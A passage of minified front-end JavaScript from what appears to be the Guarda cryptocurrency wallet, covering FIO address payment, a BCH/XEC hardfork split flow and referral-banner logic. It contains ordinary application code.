                k.replace({
                    pathname: (0,
                    M.RU)("/fio/register-address"),
                    search: S.search
                })
            }
              , getItem = (e, t) => O.createElement(O.Fragment, null, O.createElement(IconCurrency, {
                currency: e.currency,
                className: Ht()(dj, {
                    [cj]: !hasEnoughWallet(e)
                })
            }), O.createElement("div", {
                className: t.currencyInfo
            }, O.createElement("span", {
                className: Ht()({
                    [cj]: !hasEnoughWallet(e)
                })
            }, e.title), hasEnoughWallet(e) ? O.createElement("div", null, (0,
            Ko.yF)(e.balance), " ", (0,
            be.xG)(e.currency), " ", null != e && e.isWatchOnly ? O.createElement("span", null, "(watch only)") : null) : O.createElement("div", {
                className: mj
            }, "Not enough funds")));
            return O.createElement("div", {
                className: rj
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: VU,
                style: {
                    width: "90%"
                }
            }, "Manage your human-readable address")), O.createElement("div", {
                className: lj
            }, O.createElement(sf(), {
                ref: l
            }, O.createElement(label, null, "Payment"), O.createElement("p", null, "Choose wallet to pay for FIO Address.", O.createElement("br", null), O.createElement("br", null), "You pay an equivalent of 40 FIO to register an address. You will get a bundle of 100 fee-free transactions for a year.", O.createElement("br", null)), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: p
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && i,
                    message: a
                }, O.createElement(Mh, {
                    getItem,
                    getSubItem: getItem,
                    withoutWatchOnly: !0,
                    selectedWallet: null != p ? p : void 0,
                    wallets: E,
                    onChange: handleSelectPayWallet,
                    placeholder: "Your wallet",
                    disabled: Sj,
                    isValidateOnChangeItem: hasEnoughWallet
                }))
            }
            )), !!C && O.createElement(ui_message, {
                type: "error"
            }, C), O.createElement("div", {
                className: yj
            }, O.createElement(misk_info, {
                className: gj
            }, O.createElement(MiskInfoTitle, null, "Amount to transfer:"), O.createElement(MiskInfoValue, {
                className: vj
            }, g ? `${(0,
            Ko.yF)(g.amount)} ${(0,
            be.xG)(g.currency)}` : O.createElement(LoaderDots, {
                visible: !0
            }))), O.createElement(misk_info, {
                className: gj
            }, O.createElement(MiskInfoTitle, null, "Network fee:"), O.createElement(MiskInfoValue, {
                className: vj
            }, x && I ? `${(0,
            Ko.yF)(I)} ${(0,
            be.xG)(x.currency)}` : O.createElement(LoaderDots, {
                visible: !0
            }))), O.createElement(misk_info, {
                className: gj
            }, O.createElement(MiskInfoTitle, null, "Your FIO Address:"), O.createElement(MiskInfoValue, {
                className: vj
            }, `${t.accountName}@${t.domain}`))), O.createElement("div", {
                className: sj
            }, v && O.createElement("div", {
                className: Ej
            }, v && O.createElement("span", null, v)), !c && !v && O.createElement("div", {
                className: ij
            }, "Step 2 of 4"), c && !v && O.createElement("div", {
                className: ij
            }), O.createElement("div", {
                className: hj
            }, !c && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big",
                isLoading: c
            }, "Confirm"))))))
        }
        const bch_split_use_use_initial_params = () => {
            const e = useLocationSearch()
              , t = (0,
            $.I0)()
              , a = (0,
            $.v9)(eu)
              , n = (0,
            $.v9)($c)
              , r = a(e.walletFrom || selectedCache().bchWalletBchSplit)
              , l = e.walletFrom && e.walletTo
              , [s,i] = (0,
            O.useState)(r || void 0)
              , [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)(e.currency || "")
              , setFromWallet = e => {
                if (e && (e.currency === _e.ND.bch || e.currency === _e.ND.xec)) {
                    t(setCacheKey("bchWalletBchSplit", e.uuid));
                    i(e)
                }
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (!o && n.length && !l) {
                    r && i(r);
                    if (!r) {
                        const e = n.find((e => e.currency === u));
                        setFromWallet(e)
                    }
                    c(!0)
                }
            }
            ), [n]);
            (0,
            O.useEffect)(( () => {
                if (n.length) {
                    const t = a(e.walletFrom);
                    t && o && i(t);
                    e.currency && d(e.currency)
                }
            }
            ), [n, e]);
            return [s, setFromWallet, u, d]
        }
          , bch_split_use_use_wallets_from = e => {
            const t = undefined;
            return [...(0,
            $.v9)($c)].filter((t => t.currency === e))
        }
          , Cj = {
            wrapper: "BchSplitMainPage_wrapper_137hu app_wrapperBlock_2EpA3",
            loaderCircle: "BchSplitMainPage_loaderCircle_1246S",
            title: "BchSplitMainPage_title_1jgsW",
            wrapperForm: "BchSplitMainPage_wrapperForm_3JPwJ app_wrapperLeftBlock_3QLZp",
            customWrapperCurrencies: "BchSplitMainPage_customWrapperCurrencies_vx7VA",
            rightMessage: "BchSplitMainPage_rightMessage_3qr08",
            isWallet: "BchSplitMainPage_isWallet_1j8WI",
            loaderContainer: "BchSplitMainPage_loaderContainer_3DW0G",
            currencyFromWallet: "BchSplitMainPage_currencyFromWallet_2joWt",
            footerBlock: "BchSplitMainPage_footerBlock_varBH app_footerBlock_n86Kc",
            stepInfo: "BchSplitMainPage_stepInfo_1szIY app_stepInfo_2VLE6",
            iconSwapWallets: "BchSplitMainPage_iconSwapWallets_2mf2w",
            checkboxText: "BchSplitMainPage_checkboxText_17zau",
            loader: "BchSplitMainPage_loader_1iQRg",
            external: "BchSplitMainPage_external_1r0Fv",
            feeTooltipIcon: "BchSplitMainPage_feeTooltipIcon_2Gn87",
            networkFeeTooltip: "BchSplitMainPage_networkFeeTooltip_3d_tO",
            feeTooltip: "BchSplitMainPage_feeTooltip_3ftSq",
            userSelect: "BchSplitMainPage_userSelect_1eqaq",
            inputWrapper: "BchSplitMainPage_inputWrapper_1iLZS",
            walletsWrapper: "BchSplitMainPage_walletsWrapper_sLQ9t",
            wrapperList: "BchSplitMainPage_wrapperList_1iUuv",
            marginTop: "BchSplitMainPage_marginTop_1n-HU",
            availableBlock: "BchSplitMainPage_availableBlock_anqVE",
            infoTitle: "BchSplitMainPage_infoTitle_3Pktl",
            infoValue: "BchSplitMainPage_infoValue_2dPES",
            exchangeInfo: "BchSplitMainPage_exchangeInfo_iPRP-",
            exchangeRate: "BchSplitMainPage_exchangeRate_1PlvO",
            exchangeNetworkFee: "BchSplitMainPage_exchangeNetworkFee_1qQun",
            resultBlock: "BchSplitMainPage_resultBlock_2uaAP",
            currencyPairMsg: "BchSplitMainPage_currencyPairMsg_uAA2b",
            insufficientFundsMsg: "BchSplitMainPage_insufficientFundsMsg_SevzF",
            errorInput: "BchSplitMainPage_errorInput_3Av2Q",
            toWalletInput: "BchSplitMainPage_toWalletInput_2Qpt2",
            inputWrapperClassName: "BchSplitMainPage_inputWrapperClassName_2Yyt1",
            errorInfo: "BchSplitMainPage_errorInfo_3a4Zh",
            blockerError: "BchSplitMainPage_blockerError_2m5tZ",
            feeWalletError: "BchSplitMainPage_feeWalletError_-2Pet",
            supportRef: "BchSplitMainPage_supportRef_QOSDE",
            undoButton: "BchSplitMainPage_undoButton_BMcyj",
            timeToExecution: "BchSplitMainPage_timeToExecution_3qS5U",
            undoText: "BchSplitMainPage_undoText_1q8H-",
            exchangeNotification: "BchSplitMainPage_exchangeNotification_2gT2e"
        };
        let Nj = "";
        function BchSplitMainPage_BchSplitMainPage() {
            const e = (0,
            j.k6)()
              , t = (0,
            $.I0)()
              , a = O.createRef()
              , n = (0,
            $.v9)($c)
              , [r,,l] = bch_split_use_use_initial_params()
              , [s,i] = (0,
            O.useState)({
                send: "",
                receive: "",
                addressTo: ""
            })
              , [o,c] = (0,
            O.useState)([])
              , [u,d] = (0,
            O.useState)(void 0)
              , [m,p] = (0,
            O.useState)(void 0)
              , [f,E] = (0,
            O.useState)(!0);
            (0,
            O.useEffect)(( () => {
                const t = undefined
                  , getAndCheckUtxos = async () => {
                    if (m && u) {
                        const [t,a] = await Promise.all([Se.Z.getApiByCurrency(_e.ND.bch), Se.Z.getApiByCurrency(_e.ND.xec)]);
                        if ("object" == typeof r) {
                            const [n,l] = await Promise.all([t.getAllUtxos(null == u ? void 0 : u.address), a.getAllUtxos(null == m ? void 0 : m.address)]);
                            let s = !1;
                            n.length !== l.length && (s = !0);
                            for (let e = 0; e < n.length; e += 1) {
                                const t = undefined;
                                if (!l.find((t => n[e].txId === t.txId))) {
                                    s = !0;
                                    break
                                }
                            }
                            if (s) {
                                const t = new URLSearchParams({
                                    type: "bchSplitAlready",
                                    walletFrom: r.uuid,
                                    currency: r.currency
                                });
                                e.replace({
                                    pathname: (0,
                                    M.RU)("/send/success"),
                                    search: t.toString()
                                })
                            }
                            E(!1)
                        }
                    }
                }
                ;
                (async () => {
                    const {data: e} = await zP.get("/amount");
                    i(e)
                }
                )();
                getAndCheckUtxos()
            }
            ), [u, r, e, m]);
            (0,
            O.useEffect)(( () => () => {
                Nj = ""
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                if (!n || 0 === n.length || !r)
                    return;
                const e = r.currency === _e.ND.bch ? _e.ND.xec : _e.ND.bch
                  , createWallet = async () => {
                    if (Nj && Nj === r.address)
                        return;
                    const a = _e.ZP.getClass({
                        currency: e
                    })
                      , l = await (new a).create({
                        currency: e,
                        privateKey: r.privateKey
                    });
                    Nj = l.address;
                    const s = undefined;
                    n.find((t => t.address === l.address && t.currency === e)) || t(rd.addWallet({
                        wallet: l,
                        options: {
                            downloadType: Sm.AFTER_CREATE_WALLET
                        }
                    }));
                    if (l.currency === _e.ND.bch) {
                        d(l);
                        p(r)
                    } else {
                        d(r);
                        p(l)
                    }
                }
                  , a = n.find((t => t.address === r.address && t.currency === e));
                a ? r.currency === _e.ND.bch ? d(r) : d(a) : createWallet()
            }
            ), [n, l, r, u, t]);
            const [h,g] = (0,
            O.useState)(!1)
              , y = bch_split_use_use_wallets_from(_e.ND.bch)
              , v = {
                uuid: "",
                address: s.addressTo || "",
                currency: l
            }
              , [_] = use_fee(u, v, (0,
            Ko.y4)(s.send || 0));
            (0,
            O.useEffect)(( () => {
                h && g(!1)
            }
            ), [u]);
            const handleChangeFromWallet = e => {
                d(e);
                t(updateWalletsBalanceAndTxs(e, {
                    isCascade: !1
                }))
            }
              , handleNext = async () => {
                var t;
                g(!1);
                const {isValid: n} = null == a || null === (t = a.current) || void 0 === t ? void 0 : t.validate();
                if (!n) {
                    g(!0);
                    return
                }
                const r = new URLSearchParams({
                    walletFrom: (null == u ? void 0 : u.uuid) || "",
                    currency: l || ""
                });
                e.push({
                    pathname: (0,
                    M.RU)("/bch-split/confirm"),
                    search: r.toString()
                })
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (!y || 0 === y.length)
                    return;
                const fetch = async () => {
                    const e = []
                      , t = [];
                    for (const t of y)
                        e.push(zP(`/invoice/${t.address}`));
                    const a = await Promise.all(e.map((e => e.catch((e => e)))));
                    for (let e = 0; e < a.length; e += 1)
                        a[e]instanceof Error || !1 === a[e].data.found && t.push(y[e]);
                    c(t)
                }
                ;
                fetch()
            }
            ), [u]);
            const w = (0,
            Ko.PD)(_ || 0, s.send || 0).toString()
              , b = {
                min: w
            };
            return O.createElement("div", {
                className: Cj.wrapper
            }, O.createElement(DashboardMenu, null), f ? O.createElement("div", {
                className: Cj.loaderContainer
            }, O.createElement(loader, {
                visible: !0,
                width: 50
            })) : O.createElement(O.Fragment, null, O.createElement(XO, null, O.createElement(panel_right_image, {
                src: mD
            }, "Split your addresses after hardfork to avoid losing funds")), O.createElement("div", {
                className: Ht()(Cj.wrapperForm)
            }, O.createElement(ui_message, {
                type: "info"
            }, "The BCH hardfork on November 15, 2020 led to the formation of a new ABC Network, and now this is eCash (XEC). Your address and balance are duplicated in ABC. Any transaction will also get duplicated in both Networks. To avoid losing funds, split your funds and automatically get two separate addresses with current balances."), O.createElement(sf(), {
                ref: a
            }, O.createElement(label, null, "BCH wallet for split"), O.createElement(lf.ValidatorField, {
                rules: [...zf.bchSplitAmount(b), ...zf.wallet],
                value: r
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && h,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: u,
                    onChange: handleChangeFromWallet,
                    wallets: o,
                    customFilter: e => onCustomFilterWallets(e, [_e.ND.bch]),
                    emptyPlaceholder: "You can select only BCH here"
                }))
            }
            )), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Fee:"), O.createElement(MiskInfoValue, {
                disabled: null == _
            }, (0,
            Ko.yF)(w), " ", (0,
            be.xG)(_e.ND.bch))), O.createElement("div", {
                className: Cj.separator
            }), O.createElement("div", {
                className: Cj.footerBlock
            }, O.createElement("div", {
                className: Cj.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next"))))))
        }
        const Tj = "BchSplitCompleteConfirm_wrapper_27YLF app_wrapperBlock_2EpA3"
          , Aj = "BchSplitCompleteConfirm_wrapperForm_oIm8_ app_wrapperLeftBlock_3QLZp"
          , xj = "BchSplitCompleteConfirm_lock_3To8_"
          , Ij = "BchSplitCompleteConfirm_headerTitles_29lMG"
          , Pj = "BchSplitCompleteConfirm_separator_3jp_p"
          , Lj = "BchSplitCompleteConfirm_captcha_bTJoI"
          , Fj = "BchSplitCompleteConfirm_footerBlock_2Ggv9"
          , Wj = "BchSplitCompleteConfirm_buttonsWrapper_PI36c"
          , Rj = "BchSplitCompleteConfirm_stepInfo_1a2wb"
          , Bj = "BchSplitCompleteConfirm_feeInfoToggle_12_iG"
          , Oj = "BchSplitCompleteConfirm_loaderWrapper_186Ku"
          , Dj = "BchSplitCompleteConfirm_updateBalanceLink_pcfXK"
          , Mj = "BchSplitCompleteConfirm_wrapperCenterForm_3DP2t app_wrapperCenterBlock_bcslh"
          , Uj = "BchSplitCompleteConfirm_userSelect_25Tzq";
        let Gj = !1;
        function BchSplitConfirm() {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)($c)
              , a = (0,
            $.v9)(eu)
              , [n,r] = (0,
            O.useState)(!1)
              , [l,s] = (0,
            O.useState)("")
              , [i,o] = (0,
            O.useState)("")
              , c = useLocationSearch()
              , u = a(c.walletFrom)
              , [d,m] = (0,
            O.useState)(void 0)
              , p = (0,
            j.k6)()
              , f = (0,
            j.TH)()
              , [E,h] = (0,
            O.useState)({
                send: "",
                receive: "",
                addressTo: ""
            })
              , [g,y] = (0,
            O.useState)(void 0)
              , {currency: v} = c;
            (0,
            O.useEffect)(( () => {
                if (!t || 0 === t.length || !d)
                    return;
                const e = t.find((e => !![_e.ND.bch, _e.ND.xec].includes(e.currency) && (e.address === d.address && e.currency !== d.currency)));
                y(e)
            }
            ), [t, v, d]);
            (0,
            O.useEffect)(( () => {
                t.length && u && m(u)
            }
            ), [u, t]);
            (0,
            O.useEffect)(( () => {
                const e = undefined;
                (async () => {
                    const {data: e} = await zP.get("/amount");
                    h(e)
                }
                )()
            }
            ), []);
            const _ = {
                uuid: "",
                address: E.addressTo || "",
                currency: v || ""
            }
              , [w,b,k,S] = use_fee(d, _, (0,
            Ko.y4)(E.send || 0))
              , [C] = fee_wallet(d);
            (0,
            O.useEffect)(( () => {
                d && e(updateWalletsBalanceAndTxs(d, {
                    isCascade: !1
                }))
            }
            ), [e, d]);
            const setProcess = async e => {
                s(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                setProcess(k ? "Loading Fee..." : "")
            }
            ), [k]);
            (0,
            O.useEffect)(( () => {
                if (i) {
                    Gj = !1;
                    setProcess("");
                    r(!1)
                }
            }
            ), [i]);
            (0,
            O.useEffect)(( () => {
                l && !n && r(!0);
                if (!l) {
                    Gj = !1;
                    r(!1)
                }
            }
            ), [l]);
            const handleBack = () => {
                p.replace({
                    pathname: (0,
                    M.RU)("/bch-split"),
                    search: f.search
                })
            }
            ;
            if (!d)
                return null;
            const N = (0,
            Ko.PD)(w || 0, E.send || 0).toString()
              , T = E.send && (0,
            Ko.gt)(N, d.balance)
              , formatTicker = e => (0,
            be.xG)(e).toUpperCase()
              , handleUpdateBalance = t => async () => {
                setProcess("Updating wallet balance...");
                await e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !1
                }));
                setProcess("")
            }
              , handleConfirmTransaction = async () => {
                if (Gj)
                    return;
                if (k)
                    return;
                if (b)
                    return;
                if (T)
                    return;
                Gj = !0;
                o("");
                await setProcess("Updating wallet balance...");
                await e(updateWalletsBalanceAndTxs(d, {
                    isCascade: !1
                }));
                await setProcess(`Loading ${formatTicker(d.currency)} Blockchain adapter...`);
                await setProcess("Creating swap transaction...");
                await setProcess("Successfully created an swap transaction");
                await setProcess("Preparing transaction...");
                await setProcess("Broadcasting transaction to network...");
                const t = await tM.send("send", d, _, C, {
                    amount: E.send,
                    isFeeIncluded: !1,
                    fee: w || "",
                    gasLimit: "",
                    gasPrice: "",
                    rounds: ""
                });
                if (t.error)
                    o(t.error);
                else if (t.hash) {
                    if (!g) {
                        const t = d.currency === _e.ND.bch ? _e.ND.xec : _e.ND.bch
                          , a = _e.ZP.getClass({
                            currency: t
                        })
                          , n = await (new a).create({
                            currency: t,
                            privateKey: d.privateKey
                        });
                        e(rd.addWallet({
                            wallet: n,
                            options: {
                                downloadType: Sm.AFTER_CREATE_WALLET
                            }
                        }))
                    }
                    cc.$.send(cc.d.BCH_SPLIT_START_SUCCESS);
                    try {
                        await zP.post(`/invoice/${d.address}`)
                    } catch (e) {}
                    const a = new URLSearchParams({
                        type: "bchSplitSuccess",
                        amount: E.send,
                        hash: t.hash,
                        walletFrom: d.uuid,
                        currency: d.currency === _e.ND.bch ? _e.ND.xec : _e.ND.bch
                    });
                    p.replace({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: a.toString()
                    })
                }
            }
            ;
            return O.createElement("div", {
                className: Tj
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Please check details and confirm. You will receive the transaction to the BCH address within 8 hours. After that, in the wallet Split section, click Complete to finish the split. New XEC wallet will be added automatically.")), O.createElement("div", {
                className: Aj
            }, O.createElement("div", {
                className: Ij
            }, O.createElement("h2", null, "Split details confirmation")), O.createElement(ConfirmInfoWallet, {
                type: "from",
                wallet: d,
                title: "Wallet to split"
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Balance:"), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(null == d ? void 0 : d.balance), " ", formatTicker(d.currency))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Fee:"), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(N), " ", formatTicker(d.currency))), T && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", formatTicker(d.currency), " Balance. Available balance: ", d.balance, " ", formatTicker(d.currency), O.createElement("br", null), O.createElement("a", {
                className: Dj,
                onClick: handleUpdateBalance(d)
            }, "Update wallet balance")), b && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: Dj,
                onClick: S
            }, "try again")), O.createElement("div", {
                className: Pj
            }), i && O.createElement(bf, {
                error: i
            }), O.createElement("div", {
                className: Fj
            }, n && O.createElement("div", {
                className: Oj
            }, l && O.createElement("span", null, l)), !n && O.createElement("div", {
                className: Rj
            }, "Step 2 of 3"), O.createElement("div", {
                className: Wj
            }, !n && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirmTransaction,
                isLoading: n
            }, "Confirm")))), O.createElement("input", {
                id: "stakingAmountInUsd",
                type: "hidden",
                name: "amountInUsd",
                value: c.amountInUsd
            }))
        }
        let Vj = !1
          , Kj = !1;
        function BchSplitCompleteConfirm_BchSplitCompleteConfirm() {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)($c)
              , a = (0,
            $.v9)(eu)
              , [n,r] = (0,
            O.useState)(!1)
              , [l,s] = (0,
            O.useState)("")
              , [i,o] = (0,
            O.useState)("")
              , c = useLocationSearch()
              , u = a(c.walletFrom)
              , [d,m] = (0,
            O.useState)(void 0)
              , [p,f] = (0,
            O.useState)(void 0)
              , E = (0,
            j.k6)()
              , {currency: h} = c;
            (0,
            O.useEffect)(( () => {
                t.length && u && m(u)
            }
            ), [u, t]);
            (0,
            O.useEffect)(( () => {
                const createWallet = async () => {
                    if (Kj)
                        return;
                    Kj = !0;
                    const t = _e.ZP.getClass({
                        currency: _e.ND.xec
                    })
                      , a = await (new t).create({
                        currency: _e.ND.xec,
                        privateKey: null == d ? void 0 : d.privateKey
                    });
                    e(rd.addWallet({
                        wallet: a,
                        options: {
                            downloadType: Sm.AFTER_CREATE_WALLET
                        }
                    }));
                    f(a);
                    Kj = !1
                }
                ;
                if (!t || 0 === t.length || !d)
                    return;
                const a = t.find((e => e.address === d.address && e.currency === _e.ND.xec));
                a ? f(a) : createWallet()
            }
            ), [t, h, d]);
            const [g,y,v,_] = use_fee(p, p, (0,
            Ko.y4)(null == p ? void 0 : p.balance), {
                totalBalance: null == p ? void 0 : p.balance,
                amount: null == p ? void 0 : p.balance,
                feePerByte: 12
            })
              , setProcess = async e => {
                s(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                setProcess(v ? "Loading Fee..." : "")
            }
            ), [v]);
            (0,
            O.useEffect)(( () => {
                if (i) {
                    Vj = !1;
                    setProcess("");
                    r(!1)
                }
            }
            ), [i]);
            (0,
            O.useEffect)(( () => {
                l && !n && r(!0);
                if (!l) {
                    Vj = !1;
                    r(!1)
                }
            }
            ), [l]);
            if (!d)
                return null;
            const w = (0,
            Ko.gt)(g, null == p ? void 0 : p.balance)
              , formatTicker = e => (0,
            be.xG)(e).toUpperCase()
              , handleUpdateBalance = t => async () => {
                setProcess("Updating wallet balance...");
                await e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !1
                }));
                setProcess("")
            }
              , handleConfirmTransaction = async () => {
                if (Vj)
                    return;
                if (v)
                    return;
                if (y)
                    return;
                if (w)
                    return;
                if (!p)
                    return;
                Vj = !0;
                o("");
                await setProcess("Updating wallet balance...");
                await e(updateWalletsBalanceAndTxs(p, {
                    isCascade: !1
                }));
                await setProcess(`Loading ${formatTicker(null == p ? void 0 : p.currency)} Blockchain adapter...`);
                await setProcess("Creating swap transaction...");
                await setProcess("Successfully created an swap transaction");
                await setProcess("Preparing transaction...");
                await setProcess("Broadcasting transaction to network...");
                const t = await tM.send("send", p, p, p, {
                    amount: null == p ? void 0 : p.balance,
                    isFeeIncluded: !0,
                    fee: g || "",
                    totalBalance: null == p ? void 0 : p.balance,
                    feePerByte: 12,
                    gasLimit: "",
                    gasPrice: "",
                    rounds: ""
                });
                if (t.error)
                    o(t.error);
                else if (t.hash) {
                    cc.$.send(cc.d.BCH_SPLIT_DONE_SUCCESS);
                    try {
                        await zP.post(`/invoice/${null == p ? void 0 : p.address}/done`)
                    } catch (e) {
                        console.info(e)
                    }
                    const e = new URLSearchParams({
                        type: "bchSplitCompleteSuccess",
                        amount: null == p ? void 0 : p.balance,
                        hash: t.hash,
                        walletFrom: null == p ? void 0 : p.uuid,
                        currency: null == p ? void 0 : p.currency
                    });
                    E.replace({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: e.toString()
                    })
                }
            }
            ;
            return p ? O.createElement("div", {
                className: Tj
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Please check the details. After the Network confirms this transaction, the split will be completed.")), O.createElement("div", {
                className: Aj
            }, O.createElement("div", {
                className: Ij
            }, O.createElement("h2", null, "Split details confirmation")), O.createElement(ConfirmInfoWallet, {
                type: "from",
                wallet: p,
                title: "Wallet to split"
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Balance:"), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(null == p ? void 0 : p.balance), " ", formatTicker(null == p ? void 0 : p.currency))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Fee:"), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(g), " ", formatTicker(null == p ? void 0 : p.currency))), w && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", formatTicker(null == p ? void 0 : p.currency), " Balance. Available balance: ", null == p ? void 0 : p.balance, " ", formatTicker(null == p ? void 0 : p.currency), O.createElement("br", null), O.createElement("a", {
                className: Dj,
                onClick: handleUpdateBalance(p)
            }, "Update wallet balance")), y && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: Dj,
                onClick: _
            }, "try again")), O.createElement("div", {
                className: Pj
            }), i && O.createElement(bf, {
                error: i
            }), O.createElement("div", {
                className: Fj
            }, n && O.createElement("div", {
                className: Oj
            }, l && O.createElement("span", null, l)), !n && O.createElement("div", {
                className: Rj
            }, "Step 1 of 2"), O.createElement("div", {
                className: Wj
            }, O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirmTransaction,
                isLoading: n
            }, "Confirm")))), O.createElement("input", {
                id: "stakingAmountInUsd",
                type: "hidden",
                name: "amountInUsd",
                value: c.amountInUsd
            })) : null
        }
        const Hj = "referral-banner-status"
          , zj = ["status"]
          , jj = "@banner/SET_REFERRAL_BANNER_STATUS"
          , $j = (0,
        Ru.Z)({
            [jj]: (e, t) => {
                let {status: a} = t;
                return {
                    ...e,
                    status: a
                }
            }
        }, {
            status: !1
        })
          , selectedReferralBannerStatus = e => e[Hj].status
          , closeReferralBanner = () => async e => {
            e({
                type: jj,
                status: !0
            })
        }
        ;
        var Zj = a(18823)
          , Yj = a.n(Zj);
        const qj = a.p + "84f7a35be2492122c022245a476d738e.svg"
          , Xj = "banner-view_wrapper_1BEBJ app_wrapperBlock_2EpA3"
          , Qj = "banner-view_wrapperShadow_1weB4"
          , Jj = "banner-view_closeButton_2-XKL"
          , e$ = "banner-view_info_1xmiy"
          , t$ = "banner-view_refImage_3pzdo"
          , a$ = "banner-view_refBannerWrapper_HrpZE"
          , BannerView_BannerView = e => {
            let {title: t, content: a, handleGoToLink: n, handleCloseBanner: r, BannerLogo: l, link: s} = e;
            return O.createElement("div", {
                className: Xj
            }, O.createElement("div", {
                className: Ht()(Qj, a$),
                onClick: n
            }, l && O.createElement("img", {
                width: 76,
                height: 76,
                src: l,
                alt: "bannerLogo",
                className: t$
            }), O.createElement("div", {
                className: e$
            }, O.createElement("h4", null, t), O.createElement("p", null, a, s && (s.includes("/app") ? O.createElement("img", {
                width: 12,
                height: 12,
                alt: "link icon",
                src: qj
            }) : O.createElement("a", {
                target: "_blank",
                href: s,
                rel: "noreferrer"
            }, O.createElement("img", {
                width: 12,
                height: 12,
                alt: "link icon",
                src: qj
            })))))), O.createElement("div", {
                className: Jj,
                dangerouslySetInnerHTML: {
                    __html: Yj()
                },
                onClick: r
            }))
        }
          , n$ = undefined
          , r$ = Jf().create({
            ...U.Vs,
            baseURL: U.Vs.baseURL + "api/v3/referral",
            timeout: U.Tn || 2e4
        })
          , l$ = "referral-program"
          , s$ = ["referrerLink", "rewardAddress", "isActivated", "referralId"]
          , i$ = "@referral/SET_REFERRER_LINK_ID"
          , o$ = {}
          , c$ = (0,
        Ru.Z)({
            [i$]: (e, t) => {
                let {referrerLink: a, rewardAddress: n} = t;
                return {
                    ...e,
                    referrerLink: a,
                    rewardAddress: n
                }
            }
        }, o$)
          , createReferrerLink = e => async t => {
            const {data: {link: a}} = await r$.post("/link", e);
            t({
                type: i$,
                referrerLink: a,
                rewardAddress: e.address
            });
            t(closeReferralBanner());
            return a
        }
          , getReferrerLinks = e => async () => {
            const t = e.map((e => ({
                currency: e.currency,
                address: e.address
            })));
            try {
                const {data: e} = await r$.post("/links", t);
                return e
            } catch (e) {
                console.error("error get existed links", e)
            }
            return []
        }
          , activateReferralLink = e => async t => {
            const a = undefined
              , n = {
                backupId: await t(getSecureData(tt)),
                linkId: e
            };
            try {
                const {data: a} = await r$.post("/link/activate", n);
                await t(setSecureData(at, {
                    isActivated: a.status,
                    referralId: e
                }));
                cc.$.send(cc.d.REFERRAL_CREATE_BACKUP_ACTIVATE_LINK, e)
            } catch (t) {
                cc.$.send(cc.d.REFERRAL_CREATE_BACKUP_ACTIVATE_LINK_ERROR, e);
                console.log("error activating referral link", t)
            }
        }
          , createExchangeWithRewardForRefProg = e => async t => {
            const a = await t(getSecureData("uuid"));
            Object.assign(e, {
                backupId: a
            });
            try {
                await r$.post("/exchange", e)
            } catch (e) {
                console.log("error creating exchange with reward for referral program", e)
            }
        }
          , getReferralStats = e => async () => {
            const {data: t} = await r$.post("/stats", e);
            return t
        }
          , getTokenPrice = e => async () => {
            const {data: {amountUsd: t}} = await r$.get(`/token-price/${e}`);
            return t
        }
          , useReferralBannerInfo = () => {
            const e = (0,
            $.I0)()
              , t = !0
              , [a,n] = (0,
            O.useState)(!1)
              , r = "Your friends will thank you later 🙌"
              , l = "Share Guarda with others and earn rewards. Go to Settings to learn more about our referral program 🤝"
              , s = (0,
            $.v9)($c)
              , i = (0,
            O.useMemo)(( () => !!s.length && s.filter((e => !e.watchOnly && "eth" === e.currency && !e.hw))), [s])
              , o = (0,
            O.useCallback)((async () => {
                i && i.length,
                0
            }
            ), [e, i, t]);
            (0,
            O.useEffect)(( () => {
                o()
            }
            ), [o]);
            (0,
            O.useEffect)((function updateIsVisible() {
                (0,
                M.U_)();
                if (a)
                    return n(!1)
            }
            ), [t]);
            return {
                bannerTitle: r,
                bannerContent: l,
                isVisible: a
            }
        }
          , u$ = a.p + "1acd72fd155ff90a210ff84ec72b33a9.svg"
          , ReferralBanner = () => {
            const e = (0,
            j.k6)()
              , t = (0,
            $.I0)()
              , {bannerTitle: a, bannerContent: n, isVisible: r} = useReferralBannerInfo()
              , handleCloseBanner = e => {
